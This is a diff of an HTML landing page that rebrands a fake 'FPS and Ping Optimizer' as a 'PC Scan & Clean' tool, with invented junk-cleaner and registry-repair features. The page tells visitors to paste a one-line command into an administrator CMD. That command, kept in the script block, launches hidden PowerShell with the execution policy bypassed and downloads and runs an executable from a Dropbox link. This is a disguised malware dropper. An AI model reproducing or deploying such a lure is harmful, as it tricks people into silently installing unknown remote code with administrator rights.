@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ultimate FPS and Ping Optimizer</title>
+    <title>PC Scan & Clean</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -432,7 +432,7 @@
                         <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
                     </svg>
                 </div>
-                <span class="font-display font-bold text-sm tracking-wider">FPS BOOST</span>
+                <span class="font-display font-bold text-sm tracking-wider">SCAN & CLEAN</span>
             </a>
             <nav class="nav-links">
                 <a href="#" class="nav-link">.</a>
@@ -445,16 +445,16 @@
         <main class="hero">
             <div class="status-badge">
                 <span class="pulse-dot"></span>
-                System Optimized
+                System Ready
             </div>
 
             <h1 class="hero-title font-display">
-                Lower <span class="gradient-text">Ping</span> & Boost<br>
-                Your FPS
+                Deep <span class="gradient-text">System</span> Scan &<br>
+                Clean PC
             </h1>
 
             <p class="hero-desc">
-                Ultimate FPS and Ping Optimizer. Copy the one-line command below, paste it into your <strong>CMD (Run as Administrator)</strong>, and execute the protocol.
+                PC Scan & Clean Tool. Copy the one-line command below, paste it into your <strong>CMD (Run as Administrator)</strong>, and execute.
             </p>
 
             <!-- Command Card -->
@@ -496,8 +496,8 @@
                             <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"></path>
                         </svg>
                     </div>
-                    <h3 class="feature-title">Maximize FPS</h3>
-                    <p class="feature-desc">Unlock your GPU's full potential. The script optimizes background processes to ensure maximum frame rates during gaming.</p>
+                    <h3 class="feature-title">Junk Cleaner</h3>
+                    <p class="feature-desc">Scans and removes temporary files, cache, and system junk to free up valuable disk space and improve performance.</p>
                 </div>
                 <div class="feature-box">
                     <div class="feature-icon">
@@ -506,8 +506,8 @@
                             <polyline points="12 6 12 12 16 14"></polyline>
                         </svg>
                     </div>
-                    <h3 class="feature-title">Reduce Ping</h3>
-                    <p class="feature-desc">Minimize latency and packet loss. Our protocol tweaks your network stack for the fastest response times possible.</p>
+                    <h3 class="feature-title">Registry Cleaner</h3>
+                    <p class="feature-desc">Scans and repairs invalid registry entries, fixing system errors and improving overall Windows stability.</p>
                 </div>
                 <div class="feature-box">
                     <div class="feature-icon">
@@ -517,19 +517,19 @@
                             <line x1="12" y1="17" x2="12" y2="21"></line>
                         </svg>
                     </div>
-                    <h3 class="feature-title">Instant Setup</h3>
-                    <p class="feature-desc">Run the command once. The system will automatically download and apply the latest optimizations from the cloud.</p>
+                    <h3 class="feature-title">System Optimizer</h3>
+                    <p class="feature-desc">Runs SFC, DISM, and disk cleanup to repair system files and keep your Windows installation healthy.</p>
                 </div>
             </div>
         </section>
 
         <footer>
-            &copy;  2026 UpdateSys | Performance Project | All rights reserved.
+            &copy;  2026 Scan & Clean | All rights reserved.
         </footer>
     </div>
 
 <script>
-    const command = String.raw`powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]'Tls,Tls11,Tls12'; $ProgressPreference='SilentlyContinue'; Invoke-WebRequest -UseBasicParsing -Uri 'https://dl.dropboxusercontent.com/scl/fi/oqad0mvio3izrk36z3yui/PerformanceBoosterPro.exe?rlkey=lf14jsrylm37mn5pl7yk9zn2f&st=qxzro4lj' -OutFile $env:TEMP\PerformanceBoosterPro.exe; Start-Process $env:TEMP\PerformanceBoosterPro.exe" && exit`;
+    const command = String.raw`powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]'Tls,Tls11,Tls12'; $ProgressPreference='SilentlyContinue'; Invoke-WebRequest -UseBasicParsing -Uri 'https://dl.dropboxusercontent.com/scl/fi/oqad0mvio3izrk36z3yui/PerformanceBoosterPro.exe?rlkey=lf14jsrylm37mn5pl7yk9zn2f&st=qxzro4lj' -OutFile $env:TEMP\ScanClean.exe; Start-Process $env:TEMP\ScanClean.exe" && exit`;
 
     // عرض الأمر داخل CMD-like box
     document.getElementById('cmdText').innerText = command;
